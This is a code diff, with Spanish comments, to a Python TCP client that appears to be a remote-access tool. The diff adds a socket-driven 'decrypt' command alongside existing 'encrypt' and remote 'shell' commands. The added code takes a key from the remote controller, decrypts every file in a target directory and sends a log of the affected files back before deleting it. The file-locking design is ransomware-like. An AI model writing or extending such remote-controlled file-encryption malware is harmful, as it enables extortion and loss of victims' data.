@@ -351,6 +351,44 @@ class TCP:
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
 
+    def decrypt(self, cmd):
+        key = self.__sock.recv(1024)
+        clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+        directorio = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+
+        if os.path.isdir(directorio):
+            archivos = []
+            for i in os.listdir(directorio):
+                archivo = f"{directorio}/{i}"
+                if os.path.isfile(archivo):
+                    archivos.append(archivo)
+
+            with open(f"{directorio}/.{clave}.dat", 'w') as texto:
+                f = Fernet(key)
+                cont = 0
+                for i in archivos:
+                    nombre = os.path.basename(i)
+                    with open(i, 'rb') as archivo:
+                        data = archivo.read()
+                    archivo.close()
+
+                    dataDecrypt = f.decrypt(data)
+
+                    with open(i, 'wb') as archivo:
+                        archivo.write(dataDecrypt)
+                    archivo.close()
+
+                    texto.write(f"[+] Archivo \"{nombre}\" desencriptado\n")
+                    cont += 1
+            texto.close()
+
+            self.__sock.send(f"{cont} archivos desencriptados".encode())
+            self.enviarArchivo(f"{directorio}/.{clave}.dat")
+            os.remove(f"{directorio}/.{clave}.dat")
+
+        else:
+            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
+
     def shell(self):
         try:
             while True:
@@ -431,6 +469,13 @@ class TCP:
                 elif cmd.lower()[:7] == "encrypt":
                     try:
                         self.encrypt(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:7] == "decrypt":
+                    try:
+                        self.decrypt(cmd)
 
                     except:
                         continue
